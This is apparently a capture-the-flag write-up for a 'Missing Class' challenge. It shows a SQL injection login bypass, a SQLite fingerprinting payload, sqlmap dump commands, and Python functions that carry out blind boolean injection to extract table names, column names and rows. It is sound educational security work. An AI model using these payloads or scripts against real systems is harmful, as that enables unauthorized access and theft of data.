# CTF Competition: BTC CTF

### CTF Name: Missing Class
**CTF Weight:** 300 points ~ 17 solves

![Screenshot from 2024-05-25 12-04-46](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/770dabe4-6c1a-45a7-b5ae-324be140f812)



## Writeup:

From the challenge description, it was clear that this was an SQL injection challenge since it specifically said not to use SQLMAP.

Initially, I went to the website and found that the login was indeed SQL injectable. I used an extremely basic SQL injection string into the username field; the password could be anything.


| **Username**       | **Password** |
|--------------------|--------------|
| `'OR''=''-- -`     | `a`          |

![Screenshot from 2024-05-26 17-51-57](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/f9ee7400-d126-4db3-a1ab-f87544af6c14)


The login was successful, indicating no sanitization/filtering in the user input boxes and that the SQL query used single quotes.

Since I was unable to retrieve any more information from the schedule page by checking the source code, cookies, or playing with buttons, I decided to perform a blind SQL injection attack to dump the contents of the database.

For Blind SQL injection, I typically use SQLmap for its ease and speed. The commands would have been somewhat similar to this:

| Command | Reason |
| ------- | ------ |
| `sqlmap -u {website url} --data={user input field} --dbs`                                 | Shows the name of all the databases |
| `sqlmap -u {website url} --data={user input field} -D database_name --tables`             | Displays all the table names in the specified database |
| `sqlmap -u {website url} --data={user input field} -D database_name -T table_name --dump` | Dumps out all the records in that table |

**Since using SQLMAP was not allowed**, I had to write the queries myself 😓. The logic remained the same: identify the database name, table names, and then dump all the data.

To identify the database backend, I tested various backend-specific functions. Hack Tricks provides a great cheat sheet for this. 
![Screenshot from 2024-05-26 11-28-37](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/755ce632-40b9-4770-9a0d-ece110e7c5cf)

I discovered it was `SQLite` as the following payload worked:

| **Username**       | **Password** |
|--------------------|--------------|
| `' OR sqlite_version()=sqlite_version()-- -`     | `a`          |



Now that we know it is using SQLite syntax, the rest should be straightforward. Here is a general idea of the solution script:

  1) To get the table names we need to first know how many tables there are. After running the script below I got 3 tables... `classes`, `users`, and `flag`.

```
def number_of_tables():
   for i in range(1, 1000):  # Adjust the range as needed
       payload = (f"' OR (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like "
                  f"'sqlite_%' )={i}-- -")
       if inject_payload(payload):
           print(f'Number of tables: {i}')
           return i
```
```
def table_name(table_amt, table_len):
   table_names = []
   for index in range(table_amt):
       ret = ''
       for i in range(1, table_len[index]+1):  # Adjust the range as needed
           for s in string.printable:
               payload = (f"' OR (SELECT substr(tbl_name, {i}, 1) FROM sqlite_master WHERE type='table' and tbl_name not like "
                          f"'sqlite_%' limit 1 offset {index})='{s}'-- -")
               if inject_payload(payload):
                   ret += s
                   print(ret)
                   break
       table_names.append(ret)
       print(f"===== Table:{index} name is {ret} =====")
   return table_names
```

  2) Seems pretty obvious that the flag is in the `flag` table so we just need to look in there. But, to get the data out of that table we need the column names. From these two functions I found that there was just 1 column and it is also called flag. Now that we have that, we can dump the values out of the table!!!

```
def get_column_count(table_name):
   for i in range(1, 100):  # Adjust the range as needed
       payload = f"' OR (SELECT COUNT(*) FROM pragma_table_info('{table_name}'))={i}-- -"
       if inject_payload(payload):
           print(f'Number of columns in {table_name}: {i}')
           return i
   return 0
```
```
def get_column_names(table_name):
   column_count = get_column_count(table_name)
   column_names = []
   for index in range(column_count):
       column_name = ''
       for i in range(1, 100):
           column_name_length = len(column_name)
           for s in string.printable:
               payload = (f"' OR (SELECT substr(name, {i}, 1) FROM pragma_table_info('{table_name}') "
                          f"LIMIT 1 OFFSET {index})='{s}'-- -")
               if inject_payload(payload):
                   column_name += s
                   print(column_name)
                   break
           if len(column_name) == column_name_length:
               break
       column_names.append(column_name)
       print(f'Column {index}: {column_name}')
   return column_names
```

3) This function was used to dump out the contents of the table
```
def fetch_data_from_table(table_name, column_names):
   fetched_data = []
   for row_index in range(0, 15):  # Adjust the range as needed
       row_data = {}
       for column in column_names:
           column_value = ''
           for i in range(1, 100):
               flag = len(column)
               for s in string.printable:
                   payload = (f"' OR (SELECT substr({column}, {i}, 1) FROM {table_name} "
                              f"LIMIT 1 OFFSET {row_index})='{s}'-- -")
                   if inject_payload(payload):
                       column_value += s
                       print(column_value)
                       break
               if flag == len(column_value):   # No more characters
                   break
           if column_value:
               row_data[column] = column_value
       if row_data:
           fetched_data.append(row_data)
   return fetched_data
```
And we get the Flag!!!! 😎


![Screenshot from 2024-05-26 03-36-47](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/361f242c-3b6b-4089-9866-43b3b96bd425)




